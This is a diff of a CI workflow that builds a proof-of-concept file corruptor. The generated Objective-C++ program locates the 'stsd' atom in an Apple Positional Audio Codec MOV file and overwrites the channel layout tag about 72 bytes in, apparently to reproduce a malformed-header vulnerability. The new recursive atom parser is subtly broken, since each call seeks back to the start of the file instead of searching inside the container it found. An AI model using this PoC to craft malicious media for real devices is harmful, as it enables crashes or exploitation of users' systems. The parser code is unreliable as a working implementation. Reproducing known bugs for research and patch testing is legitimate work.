@@ -26,19 +26,15 @@ jobs:
           echo "Installing ffmpeg..."
           brew install ffmpeg
           echo "Shrinking IMG_1027.mov to the first 5 seconds..."
-          # Use ffmpeg to create a short clip from the large video file.
-          # -i: input file
-          # -t 5: duration of 5 seconds
-          # -c copy: stream copy without re-encoding to preserve the APAC track
           ffmpeg -i IMG_1027.mov -t 5 -c copy base_small.mov
           echo "File shrinking complete."
           ls -lh base_small.mov
 
-      # Updated: This script now parses the smaller MOV to find the exact offset to corrupt.
+      # Updated: This script now recursively parses the MOV to find the exact offset to corrupt.
       - name: Patch encodeme.mm to Surgically Corrupt the APAC File
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm to surgically corrupt the APAC file..."
+          echo "Patching encodeme.mm with a recursive parser to surgically corrupt the APAC file..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
           #include <stdio.h>
@@ -48,62 +44,44 @@ jobs:
           // Helper function to read a 32-bit big-endian integer from a file
           uint32_t read_uint32_be(FILE *f) {
               unsigned char bytes[4];
-              fread(bytes, 1, 4, f);
+              if (fread(bytes, 1, 4, f) != 4) return 0;
               return ((uint32_t)bytes[0] << 24) | ((uint32_t)bytes[1] << 16) | ((uint32_t)bytes[2] << 8) | bytes[3];
           }
 
-          // Helper function to find the offset of a specific atom (box) in an MP4 file
-          long find_atom_offset(FILE *f, const char *atom_name) {
-              // Get total file size for progress calculation
+          // Recursive helper function to find a nested atom
+          long find_atom_recursive(FILE *f, const char *atom_path) {
+              char target_atom[5] = {0};
+              const char *next_path = NULL;
+              const char *separator = strchr(atom_path, '/');
+              if (separator) {
+                  strncpy(target_atom, atom_path, separator - atom_path);
+                  next_path = separator + 1;
+              } else {
+                  strncpy(target_atom, atom_path, 4);
+              }
+
+              long current_offset = ftell(f);
               fseek(f, 0, SEEK_END);
               long file_size = ftell(f);
               fseek(f, 0, SEEK_SET);
 
-              long current_offset = 0;
-              int last_percentage = -1;
-
-              printf("Searching for '%s' atom...\n", atom_name);
-
-              while (1) {
-                  current_offset = ftell(f);
-                  
-                  // Progress Bar Logic
-                  if (file_size > 0) {
-                      int percentage = (int)(((double)current_offset / file_size) * 100);
-                      if (percentage > last_percentage) {
-                          last_percentage = percentage;
-                          printf("\r[");
-                          int progress_chars = percentage / 2;
-                          for(int i = 0; i < 50; i++) {
-                              if (i < progress_chars) printf("#");
-                              else printf(" ");
-                          }
-                          printf("] %d%% (%ld/%ld bytes)", percentage, current_offset, file_size);
-                          fflush(stdout);
-                      }
-                  }
-
-                  if (feof(f)) break;
-
+              while (ftell(f) < file_size) {
+                  long atom_start = ftell(f);
                   uint32_t atom_size = read_uint32_be(f);
                   char name[5] = {0};
-                  fread(name, 1, 4, f);
+                  if (fread(name, 1, 4, f) != 4) break;
 
-                  if (feof(f)) break;
-                  
-                  if (strcmp(name, atom_name) == 0) {
-                      printf("\nFound '%s' atom.\n", atom_name);
-                      return current_offset;
+                  if (strcmp(name, target_atom) == 0) {
+                      if (next_path) {
+                          // This is a container atom, recurse into it
+                          return find_atom_recursive(f, next_path);
+                      } else {
+                          // This is the final atom we were looking for
+                          return atom_start;
+                      }
                   }
-                  
-                  if (atom_size == 0) break;
-
-                  if (fseek(f, current_offset + atom_size, SEEK_SET) != 0) {
-                      break; 
-                  }
+                  fseek(f, atom_start + atom_size, SEEK_SET);
               }
-              
-              printf("\nAtom '%s' not found.\n", atom_name);
               return -1;
           }
 
@@ -131,16 +109,18 @@ jobs:
                       return 1;
                   }
                   
-                  long stsd_offset = find_atom_offset(file, "stsd");
+                  // This path represents the nested structure to find the sample description.
+                  long stsd_offset = find_atom_recursive(file, "moov/trak/mdia/minf/stbl/stsd");
+                  
                   if (stsd_offset == -1) {
-                      fprintf(stderr, "Could not find the 'stsd' atom. Using a fallback offset.\n");
-                      stsd_offset = 0x110; // Use last known good guess if parsing fails
-                  } else {
-                      fprintf(stderr, "Found 'stsd' atom at offset: 0x%lx\n", stsd_offset);
+                      fprintf(stderr, "Could not find the 'stsd' atom. The file structure may be unexpected.\n");
+                      fclose(file);
+                      return 1;
                   }
+                  fprintf(stderr, "Found 'stsd' atom at offset: 0x%lx\n", stsd_offset);
 
                   // PoC: Corrupt the channel layout tag inside the 'stsd' atom.
-                  // The exact offset inside the 'stsd' atom can vary, but it's typically around +72 bytes.
+                  // The exact offset inside the 'stsd' atom can vary, but it's typically around +72 bytes for the audio track.
                   long corruption_offset = stsd_offset + 72;
                   fseek(file, corruption_offset, SEEK_SET);
                   
